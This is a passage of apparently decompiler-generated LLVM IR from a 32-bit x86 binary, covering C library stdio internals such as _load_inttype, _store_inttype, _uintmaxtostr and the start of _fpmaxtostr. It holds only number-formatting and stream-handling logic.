  %v5_8054aed = call i32 @__GI_fseek(i32 %v0_8054aec, i32 0, i32 %tmp17, i32 %v1_8054ada)
  store i32 %v5_8054aed, i32* %eax.global-to-local, align 4
  %v1_8054af5 = icmp eq i32 %v5_8054aed, 0
  %v1_8054af7 = icmp eq i1 %v1_8054af5, false
  br i1 %v1_8054af7, label %dec_label_pc_8054ab6, label %dec_label_pc_8054ada.dec_label_pc_8054af9_crit_edge

dec_label_pc_8054ada.dec_label_pc_8054af9_crit_edge: ; preds = %dec_label_pc_8054ada
  %v0_8054af9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054af9

dec_label_pc_8054af9:                             ; preds = %dec_label_pc_8054ada.dec_label_pc_8054af9_crit_edge, %dec_label_pc_8054ad5, %dec_label_pc_8054ac8
  %v2_8054afe = phi i32 [ %v0_8054af9.pre, %dec_label_pc_8054ada.dec_label_pc_8054af9_crit_edge ], [ %v0_8054aec, %dec_label_pc_8054ad5 ], [ %v0_8054aec, %dec_label_pc_8054ac8 ]
  %v1_8054af9 = inttoptr i32 %v2_8054afe to i32*
  %v2_8054af9 = load i32, i32* %v1_8054af9, align 4
  %v1_8054afb = and i32 %v2_8054af9, -4
  store i32 %v1_8054afb, i32* %eax.global-to-local, align 4
  %v1_8054afe = trunc i32 %v1_8054afb to i16
  %v3_8054afe = inttoptr i32 %v2_8054afe to i16*
  store i16 %v1_8054afe, i16* %v3_8054afe, align 2
  %v0_8054b01 = load i32, i32* @ebx, align 4
  %v1_8054b01 = add i32 %v0_8054b01, 8
  %v2_8054b01 = inttoptr i32 %v1_8054b01 to i32*
  %v3_8054b01 = load i32, i32* %v2_8054b01, align 4
  store i32 %v3_8054b01, i32* %eax.global-to-local, align 4
  %v2_8054b04 = add i32 %v0_8054b01, 24
  %v3_8054b04 = inttoptr i32 %v2_8054b04 to i32*
  store i32 %v3_8054b01, i32* %v3_8054b04, align 4
  %v0_8054b07 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054b07 = load i32, i32* @ebx, align 4
  %v2_8054b07 = add i32 %v1_8054b07, 16
  %v3_8054b07 = inttoptr i32 %v2_8054b07 to i32*
  store i32 %v0_8054b07, i32* %v3_8054b07, align 4
  %v0_8054b0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8054b0a = load i32, i32* @ebx, align 4
  %v2_8054b0a = add i32 %v1_8054b0a, 20
  %v3_8054b0a = inttoptr i32 %v2_8054b0a to i32*
  store i32 %v0_8054b0a, i32* %v3_8054b0a, align 4
  %v0_8054b0d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054b0d

dec_label_pc_8054b0d:                             ; preds = %dec_label_pc_8054ac3, %dec_label_pc_8054af9
  %v2_8054b14 = phi i32 [ %v0_8054aec, %dec_label_pc_8054ac3 ], [ %v0_8054b0d.pre, %dec_label_pc_8054af9 ]
  %v1_8054b0d = inttoptr i32 %v2_8054b14 to i32*
  %v2_8054b0d = load i32, i32* %v1_8054b0d, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8054b11 = or i32 %v2_8054b0d, 64
  store i32 %v1_8054b11, i32* %eax.global-to-local, align 4
  %v1_8054b14 = trunc i32 %v1_8054b11 to i16
  %v3_8054b14 = inttoptr i32 %v2_8054b14 to i16*
  store i16 %v1_8054b14, i16* %v3_8054b14, align 2
  %v0_8054b17 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054b17 = urem i32 %v0_8054b17, 65536
  store i32 %v1_8054b17, i32* %eax.global-to-local, align 4
  %v3_8054b1a = and i32 %v0_8054b17, 2816
  %v4_8054b1a = icmp eq i32 %v3_8054b1a, 0
  %v1_8054b1d = icmp eq i1 %v4_8054b1a, false
  br i1 %v1_8054b1d, label %dec_label_pc_8054b25, label %dec_label_pc_8054b1f

dec_label_pc_8054b1f:                             ; preds = %dec_label_pc_8054b0d
  %v0_8054b1f = load i32, i32* @ebx, align 4
  %v1_8054b1f = add i32 %v0_8054b1f, 12
  %v2_8054b1f = inttoptr i32 %v1_8054b1f to i32*
  %v3_8054b1f = load i32, i32* %v2_8054b1f, align 4
  store i32 %v3_8054b1f, i32* %eax.global-to-local, align 4
  %v2_8054b22 = add i32 %v0_8054b1f, 28
  %v3_8054b22 = inttoptr i32 %v2_8054b22 to i32*
  store i32 %v3_8054b1f, i32* %v3_8054b22, align 4
  br label %dec_label_pc_8054b25

dec_label_pc_8054b25:                             ; preds = %dec_label_pc_8054b0d, %dec_label_pc_8054ab6, %dec_label_pc_8054b1f
  %v0_8054b25 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b25, i32* %eax.global-to-local, align 4
  %v2_8054b27 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054b27, i32* %edx.global-to-local, align 4
  store i32 %v0_8054a84, i32* @ebx, align 4
  ret i32 %v0_8054b25

; uselistorder directives
  uselistorder i32 %v0_8054b17, { 1, 0 }
  uselistorder i32 %v1_8054ada, { 1, 0, 2 }
  uselistorder i32 %v0_8054aec, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8054a90, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054a84, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054b0d, { 1, 0 }
  uselistorder label %dec_label_pc_8054aa3, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8054b2c = icmp slt i32 %tmp5, 0
  %v3_8054b5d = and i32 %tmp4, 2048
  %v4_8054b5d = icmp eq i32 %v3_8054b5d, 0
  br i1 %v5_8054b2c, label %dec_label_pc_8054b5d, label %dec_label_pc_8054b3b

dec_label_pc_8054b3b:                             ; preds = %entry
  %v1_8054b3e = icmp eq i1 %v4_8054b5d, false
  br i1 %v1_8054b3e, label %dec_label_pc_8054b62, label %dec_label_pc_8054b40

dec_label_pc_8054b40:                             ; preds = %dec_label_pc_8054b3b
  %v6_8054b40 = icmp eq i32 %tmp4, 256
  %v1_8054b46 = inttoptr i32 %tmp to i32*
  %v2_8054b46 = load i32, i32* %v1_8054b46, align 4
  %v1_8054b48 = icmp eq i1 %v6_8054b40, false
  br i1 %v1_8054b48, label %dec_label_pc_8054b4f, label %dec_label_pc_8054b4a

dec_label_pc_8054b4a:                             ; preds = %dec_label_pc_8054b40
  %v1_8054b4a = urem i32 %v2_8054b46, 256
  br label %dec_label_pc_8054b5a

dec_label_pc_8054b4f:                             ; preds = %dec_label_pc_8054b40
  %v6_8054b4f = icmp eq i32 %tmp4, 512
  %v1_8054b55 = icmp eq i1 %v6_8054b4f, false
  br i1 %v1_8054b55, label %dec_label_pc_8054b5a, label %dec_label_pc_8054b57

dec_label_pc_8054b57:                             ; preds = %dec_label_pc_8054b4f
  %v1_8054b57 = urem i32 %v2_8054b46, 65536
  br label %dec_label_pc_8054b5a

dec_label_pc_8054b5a:                             ; preds = %dec_label_pc_8054b4f, %dec_label_pc_8054b4a, %dec_label_pc_8054b57
  %v0_8054b5c = phi i32 [ %v2_8054b46, %dec_label_pc_8054b4f ], [ %v1_8054b4a, %dec_label_pc_8054b4a ], [ %v1_8054b57, %dec_label_pc_8054b57 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8054b5c

dec_label_pc_8054b5d:                             ; preds = %entry
  br i1 %v4_8054b5d, label %dec_label_pc_8054b68, label %dec_label_pc_8054b62

dec_label_pc_8054b62:                             ; preds = %dec_label_pc_8054b5d, %dec_label_pc_8054b3b
  %v1_8054b62 = add i32 %tmp, 4
  %v2_8054b62 = inttoptr i32 %v1_8054b62 to i32*
  %v3_8054b62 = load i32, i32* %v2_8054b62, align 4
  store i32 %v3_8054b62, i32* @edx, align 4
  %v1_8054b65 = inttoptr i32 %tmp to i32*
  %v2_8054b65 = load i32, i32* %v1_8054b65, align 4
  ret i32 %v2_8054b65

dec_label_pc_8054b68:                             ; preds = %dec_label_pc_8054b5d
  %v6_8054b68 = icmp eq i32 %tmp4, 256
  %v1_8054b6e = inttoptr i32 %tmp to i32*
  %v2_8054b6e = load i32, i32* %v1_8054b6e, align 4
  %v1_8054b70 = icmp eq i1 %v6_8054b68, false
  br i1 %v1_8054b70, label %dec_label_pc_8054b77, label %dec_label_pc_8054b72

dec_label_pc_8054b72:                             ; preds = %dec_label_pc_8054b68
  %v1_8054b72 = mul i32 %v2_8054b6e, 16777216
  %v2_8054b72 = sdiv i32 %v1_8054b72, 16777216
  br label %dec_label_pc_8054b80

dec_label_pc_8054b77:                             ; preds = %dec_label_pc_8054b68
  %v6_8054b77 = icmp eq i32 %tmp4, 512
  %v1_8054b7d = icmp eq i1 %v6_8054b77, false
  br i1 %v1_8054b7d, label %dec_label_pc_8054b80, label %dec_label_pc_8054b7f

dec_label_pc_8054b7f:                             ; preds = %dec_label_pc_8054b77
  %v1_8054b7f = mul i32 %v2_8054b6e, 65536
  %v2_8054b7f = sdiv i32 %v1_8054b7f, 65536
  br label %dec_label_pc_8054b80

dec_label_pc_8054b80:                             ; preds = %dec_label_pc_8054b77, %dec_label_pc_8054b72, %dec_label_pc_8054b7f
  %v0_8054b80 = phi i32 [ %v2_8054b6e, %dec_label_pc_8054b77 ], [ %v2_8054b72, %dec_label_pc_8054b72 ], [ %v2_8054b7f, %dec_label_pc_8054b7f ]
  %v1_8054b80 = ashr i32 %v0_8054b80, 31
  store i32 %v1_8054b80, i32* @edx, align 4
  ret i32 %v0_8054b80

; uselistorder directives
  uselistorder i32 %v0_8054b80, { 1, 0 }
  uselistorder i32 %v2_8054b6e, { 2, 0, 1 }
  uselistorder i32 %v2_8054b46, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8054b80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054b5a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b84 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b84, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8054b89 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8054b89, i32* %ebx.global-to-local, align 4
  %v4_8054b8d = trunc i32 %tmp4 to i16
  %v6_8054b95 = icmp eq i32 %tmp6, 256
  %v1_8054b9b = icmp eq i1 %v6_8054b95, false
  br i1 %v1_8054b9b, label %dec_label_pc_8054ba1, label %dec_label_pc_8054b9d

dec_label_pc_8054b9d:                             ; preds = %entry
  %v2_8054b9d = trunc i32 %tmp4 to i8
  %v4_8054b9d = bitcast i16* %tmp5 to i8*
  store i8 %v2_8054b9d, i8* %v4_8054b9d, align 1
  br label %dec_label_pc_8054bbf

dec_label_pc_8054ba1:                             ; preds = %entry
  %v6_8054ba1 = icmp eq i32 %tmp6, 2048
  %v1_8054ba7 = icmp eq i1 %v6_8054ba1, false
  br i1 %v1_8054ba7, label %dec_label_pc_8054bb0, label %dec_label_pc_8054ba9

dec_label_pc_8054ba9:                             ; preds = %dec_label_pc_8054ba1
  %sext2 = mul i32 %tmp4, 65536
  %v1_8054ba9 = sdiv i32 %sext2, 65536
  %v3_8054ba9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054ba9, i32* %v3_8054ba9, align 4
  %v0_8054bab = load i32, i32* %edx.global-to-local, align 4
  %v1_8054bab = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054bab = add i32 %v1_8054bab, 4
  %v3_8054bab = inttoptr i32 %v2_8054bab to i32*
  store i32 %v0_8054bab, i32* %v3_8054bab, align 4
  br label %dec_label_pc_8054bbf

dec_label_pc_8054bb0:                             ; preds = %dec_label_pc_8054ba1
  %v6_8054bb0 = icmp eq i32 %tmp6, 512
  %v1_8054bb6 = icmp eq i1 %v6_8054bb0, false
  br i1 %v1_8054bb6, label %dec_label_pc_8054bbd, label %dec_label_pc_8054bb8

dec_label_pc_8054bb8:                             ; preds = %dec_label_pc_8054bb0
  store i16 %v4_8054b8d, i16* %tmp5, align 2
  br label %dec_label_pc_8054bbf

dec_label_pc_8054bbd:                             ; preds = %dec_label_pc_8054bb0
  %sext3 = mul i32 %tmp4, 65536
  %v1_8054bbd = sdiv i32 %sext3, 65536
  %v3_8054bbd = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054bbd, i32* %v3_8054bbd, align 4
  br label %dec_label_pc_8054bbf

dec_label_pc_8054bbf:                             ; preds = %dec_label_pc_8054bb8, %dec_label_pc_8054ba9, %dec_label_pc_8054b9d, %dec_label_pc_8054bbd
  %v2_8054bbf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054bbf, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8054bc0 = sdiv i32 %sext, 65536
  ret i32 %v1_8054bc0

; uselistorder directives
  uselistorder label %dec_label_pc_8054bbf, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8054bcf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054bcf, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8054bdb = icmp slt i32 %arg4, 0
  %v1_8054bdd = icmp eq i1 %v2_8054bdb, false
  br i1 %v1_8054bdd, label %dec_label_pc_8054bfe, label %dec_label_pc_8054bdf

dec_label_pc_8054bdf:                             ; preds = %entry
  %v1_8054bdf = sub i32 0, %arg4
  store i32 %v1_8054bdf, i32* %esi.global-to-local, align 4
  %v2_8054be1 = icmp slt i32 %arg3, 0
  %v1_8054be3 = icmp eq i1 %v2_8054be1, false
  br i1 %v1_8054be3, label %dec_label_pc_8054bfe, label %dec_label_pc_8054be5

dec_label_pc_8054be5:                             ; preds = %dec_label_pc_8054bdf
  %v1_8054be5 = sub i32 0, %arg2
  %v5_8054be5 = icmp ne i32 %arg2, 0
  store i32 %v1_8054be5, i32* %ecx.global-to-local, align 4
  %v2_8054be7 = zext i1 %v5_8054be5 to i32
  %v3_8054be7 = add i32 %v2_8054be7, %arg3
  %v1_8054bea = sub i32 0, %v3_8054be7
  store i32 %v1_8054bea, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054bfe

dec_label_pc_8054bfe:                             ; preds = %entry, %dec_label_pc_8054bdf, %dec_label_pc_8054be5
  %v0_8054c03 = phi i32 [ %v1_8054bdf, %dec_label_pc_8054be5 ], [ %v1_8054bdf, %dec_label_pc_8054bdf ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8054be5 ], [ 0, %dec_label_pc_8054bdf ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8054c03
  %tmp30 = urem i32 -1, %v0_8054c03
  store i8 0, i8* %arg1, align 1
  %v1_8054c08 = add i32 %tmp30, 1
  %v1_8054c09 = load i32, i32* %esi.global-to-local, align 4
  %v12_8054c09 = icmp eq i32 %v1_8054c08, %v1_8054c09
  %v1_8054c13 = icmp eq i1 %v12_8054c09, false
  br i1 %v1_8054c13, label %dec_label_pc_8054c22, label %dec_label_pc_8054c15

dec_label_pc_8054c15:                             ; preds = %dec_label_pc_8054bfe
  %v1_8054c15 = add i32 %div, 1
  br label %dec_label_pc_8054c22

dec_label_pc_8054c22:                             ; preds = %dec_label_pc_8054bfe, %dec_label_pc_8054c15
  %stack_var_-20.0.off0 = phi i32 [ %v1_8054c08, %dec_label_pc_8054bfe ], [ 0, %dec_label_pc_8054c15 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8054bfe ], [ %v1_8054c15, %dec_label_pc_8054c15 ]
  %v0_8054c22 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8054c22, i32* %ebp.global-to-local, align 4
  %v0_8054c24 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054c24, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054c28

dec_label_pc_8054c28:                             ; preds = %dec_label_pc_8054c76, %dec_label_pc_8054c22
  %v0_8054c5f = phi i32 [ %v0_8054c78, %dec_label_pc_8054c76 ], [ %v0_8054c22, %dec_label_pc_8054c22 ]
  %v0_8054c2c = phi i32 [ %v1_8054c7a, %dec_label_pc_8054c76 ], [ %v0_8054c24, %dec_label_pc_8054c22 ]
  %v1_8054c28 = icmp eq i32 %v0_8054c2c, 0
  br i1 %v1_8054c28, label %dec_label_pc_8054c5f, label %dec_label_pc_8054c2c

dec_label_pc_8054c2c:                             ; preds = %dec_label_pc_8054c28
  %v0_8054c30 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8054c2c, %v0_8054c30
  %tmp31 = urem i32 %v0_8054c2c, %v0_8054c30
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8054c5f, %v0_8054c30
  %tmp32 = urem i32 %v0_8054c5f, %v0_8054c30
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8054c43 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8054c47 = add i32 %tmp32, %v6_8054c43
  %v8_8054c4d = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8054c52 = add i32 %div7, %v8_8054c4d
  store i32 %v2_8054c52, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8054c47, %v0_8054c30
  %tmp33 = urem i32 %v2_8054c47, %v0_8054c30
  %v2_8054c5a = add i32 %div8, %v2_8054c52
  br label %dec_label_pc_8054c67

dec_label_pc_8054c5f:                             ; preds = %dec_label_pc_8054c28
  %v0_8054c63 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8054c5f, %v0_8054c63
  %tmp34 = urem i32 %v0_8054c5f, %v0_8054c63
  br label %dec_label_pc_8054c67

dec_label_pc_8054c67:                             ; preds = %dec_label_pc_8054c2c, %dec_label_pc_8054c5f
  %v13_8054c6d = phi i32 [ %tmp33, %dec_label_pc_8054c2c ], [ %tmp34, %dec_label_pc_8054c5f ]
  %storemerge = phi i32 [ %v2_8054c5a, %dec_label_pc_8054c2c ], [ %div10, %dec_label_pc_8054c5f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8054c67 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054c67 = add i32 %v0_8054c67, -1
  store i32 %v1_8054c67, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8054c6d, 10
  br i1 %tmp, label %dec_label_pc_8054c6d, label %dec_label_pc_8054c72

dec_label_pc_8054c6d:                             ; preds = %dec_label_pc_8054c67
  %v2_8054c6d = add i32 %v13_8054c6d, 48
  %v12_8054c6d = and i32 %v2_8054c6d, 255
  %v14_8054c6d = and i32 %v13_8054c6d, -256
  %v15_8054c6d = or i32 %v12_8054c6d, %v14_8054c6d
  br label %dec_label_pc_8054c76

dec_label_pc_8054c72:                             ; preds = %dec_label_pc_8054c67
  %v6_8054c72 = add i32 %v13_8054c6d, %arg5
  %v21_8054c72 = and i32 %v6_8054c72, 255
  %v23_8054c72 = and i32 %v13_8054c6d, -256
  %v24_8054c72 = or i32 %v21_8054c72, %v23_8054c72
  br label %dec_label_pc_8054c76

dec_label_pc_8054c76:                             ; preds = %dec_label_pc_8054c6d, %dec_label_pc_8054c72
  %storemerge9 = phi i32 [ %v15_8054c6d, %dec_label_pc_8054c6d ], [ %v24_8054c72, %dec_label_pc_8054c72 ]
  %v1_8054c76 = trunc i32 %storemerge9 to i8
  %v3_8054c76 = inttoptr i32 %v1_8054c67 to i8*
  store i8 %v1_8054c76, i8* %v3_8054c76, align 1
  %v0_8054c78 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054c7a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054c7a = or i32 %v1_8054c7a, %v0_8054c78
  %v3_8054c7a = icmp eq i32 %v2_8054c7a, 0
  %v1_8054c7c = icmp eq i1 %v3_8054c7a, false
  br i1 %v1_8054c7c, label %dec_label_pc_8054c28, label %dec_label_pc_8054c7e

dec_label_pc_8054c7e:                             ; preds = %dec_label_pc_8054c76
  %v4_8054c7e = icmp eq i32 %storemerge11, 0
  br i1 %v4_8054c7e, label %dec_label_pc_8054c89, label %dec_label_pc_8054c85

dec_label_pc_8054c85:                             ; preds = %dec_label_pc_8054c7e
  %v0_8054c85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054c85 = add i32 %v0_8054c85, -1
  store i32 %v1_8054c85, i32* %edi.global-to-local, align 4
  %v1_8054c86 = inttoptr i32 %v1_8054c85 to i8*
  store i8 45, i8* %v1_8054c86, align 1
  br label %dec_label_pc_8054c89

dec_label_pc_8054c89:                             ; preds = %dec_label_pc_8054c7e, %dec_label_pc_8054c85
  %v0_8054c8c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054c8c

; uselistorder directives
  uselistorder i32 %v13_8054c6d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8054c47, { 1, 0 }
  uselistorder i32 %v0_8054c30, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8054c2c, { 1, 0, 2 }
  uselistorder i32 %v0_8054c5f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8054c08, { 1, 0 }
  uselistorder i32 %v0_8054c03, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054c89, { 1, 0 }
  uselistorder label %dec_label_pc_8054c76, { 1, 0 }
  uselistorder label %dec_label_pc_8054c67, { 1, 0 }
  uselistorder label %dec_label_pc_8054c22, { 1, 0 }
  uselistorder label %dec_label_pc_8054bfe, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_3()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054c95 = load i32, i32* @edi, align 4
  %v0_8054c96 = load i32, i32* @esi, align 4
  %v0_8054c97 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c97, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8054cac = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8054cac = add i3 %v4_8054cac, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8054cac, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054cb3 = add i32 %tmp156, 4
  %v2_8054cb3 = inttoptr i32 %v1_8054cb3 to i32*
  %v3_8054cb3 = load i32, i32* %v2_8054cb3, align 4
  store i32 %v3_8054cb3, i32* %eax.global-to-local, align 4
  %v1_8054cba = add i32 %tmp156, 8
  %v2_8054cba = inttoptr i32 %v1_8054cba to i8*
  %v3_8054cba = load i8, i8* %v2_8054cba, align 1
  %v4_8054cba = zext i8 %v3_8054cba to i32
  %v6_8054cba = and i32 %v0_8054c97, -256
  %v7_8054cba = or i32 %v4_8054cba, %v6_8054cba
  store i32 %v7_8054cba, i32* %ebx.global-to-local, align 4
  %v1_8054cbd = inttoptr i32 %tmp156 to i32*
  %v2_8054cbd = load i32, i32* %v1_8054cbd, align 4
  store i32 %v2_8054cbd, i32* %ebp.global-to-local, align 4
  %v2_8054cc9 = or i8 %v3_8054cba, 32
  %v7_8054cc9 = zext i8 %v2_8054cc9 to i32
  %v9_8054cc9 = and i32 %v3_8054cb3, -256
  %v10_8054cc9 = or i32 %v7_8054cc9, %v9_8054cc9
  store i32 %v10_8054cc9, i32* %eax.global-to-local, align 4
  %v10_8054ccb = icmp eq i8 %v2_8054cc9, 97
  %v1_8054cd1 = icmp eq i1 %v10_8054ccb, false
  br i1 %v1_8054cd1, label %dec_label_pc_8054cda, label %dec_label_pc_8054cd3

dec_label_pc_8054cd3:                             ; preds = %entry
  %v2_8054cd3 = add i8 %v3_8054cba, 6
  %v15_8054cd3 = zext i8 %v2_8054cd3 to i32
  %v18_8054cd3 = or i32 %v15_8054cd3, %v6_8054cba
  store i32 %v18_8054cd3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054cda

dec_label_pc_8054cda:                             ; preds = %entry, %dec_label_pc_8054cd3
  %stack_var_-207.0 = phi i8 [ %v3_8054cba, %entry ], [ %v2_8054cd3, %dec_label_pc_8054cd3 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8054ce1 = icmp slt i32 %v2_8054cbd, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8054cf0 = select i1 %v2_8054ce1, i32 6, i32 %v2_8054cbd
  store i32 %v3_8054cf0, i32* %ebp.global-to-local, align 4
  %v1_8054cf3 = add i32 %tmp156, 12
  %v2_8054cf3 = inttoptr i32 %v1_8054cf3 to i32*
  %v3_8054cf3 = load i32, i32* %v2_8054cf3, align 4
  store i32 %v3_8054cf3, i32* %eax.global-to-local, align 4
  %v2_8054cf6 = and i32 %v3_8054cf3, 2
  %v3_8054cf6 = icmp eq i32 %v2_8054cf6, 0
  br i1 %v3_8054cf6, label %dec_label_pc_8054d04, label %dec_label_pc_8054d10

dec_label_pc_8054d04:                             ; preds = %dec_label_pc_8054cda
  %v2_8054d04 = urem i32 %v3_8054cf3, 2
  %tmp192 = trunc i32 %v2_8054d04 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8054d10

dec_label_pc_8054d10:                             ; preds = %dec_label_pc_8054d04, %dec_label_pc_8054cda
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8054cda ], [ %tmp193, %dec_label_pc_8054d04 ]
  %not.v5_8054d10 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8054d10, label %dec_label_pc_8054d87, label %dec_label_pc_8054d32

dec_label_pc_8054d32:                             ; preds = %dec_label_pc_8054d10
  %v1_8054d32 = add i3 %v4_8054cac, -2
  store i3 %v1_8054d32, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8054d36 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8054d36, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8054d32
  br label %dec_label_pc_8054dc2

bb180:                                            ; preds = %dec_label_pc_8054d32
  %v5_8054d36 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8054d36, label %bb181, label %dec_label_pc_8054d3a

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8054dc2

dec_label_pc_8054d3a:                             ; preds = %bb180
  %not.v4_8054d34 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8054d34, label %dec_label_pc_8054dc2, label %dec_label_pc_8054e57

dec_label_pc_8054d87:                             ; preds = %dec_label_pc_8054d10
  store i3 %v4_8054cac, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8054d8e = add i32 %tmp156, 16
  %v2_8054d8e = inttoptr i32 %v1_8054d8e to i32*
  store i32 32, i32* %v2_8054d8e, align 4
  %v4_8054d95 = add i8 %stack_var_-207.0, -96
  %v6_8054d95 = sub i8 95, %stack_var_-207.0
  %v7_8054d95 = and i8 %v6_8054d95, %stack_var_-207.0
